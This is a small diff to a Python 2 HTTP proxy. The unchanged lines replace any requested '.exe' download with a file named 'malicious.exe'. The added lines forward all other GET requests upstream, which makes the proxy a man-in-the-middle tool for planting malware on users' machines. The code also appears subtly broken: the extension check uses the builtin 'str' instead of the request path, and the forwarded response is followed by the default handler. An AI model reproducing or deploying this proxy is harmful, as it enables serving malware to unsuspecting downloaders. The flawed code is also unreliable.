@@ -11,8 +11,11 @@ class Proxy(SimpleHTTPServer.SimpleHTTPRequestHandler):
         # manages swapping exe files
         if self.path[(len(str))-3:] == "exe":
           self.path="/malicious.exe"
+        # extremely simple forwarder
+        # fails in all but simple GETs
         else:
-          # redirect appropriately
+            urlhandle = urllib.urlopen(self.path)
+            self.wfile.write(urlhandle.read())
         return SimpleHTTPServer.SimpleHTTPRequestHandler.do_GET(self)
     def do_POST(self):
         # TODO
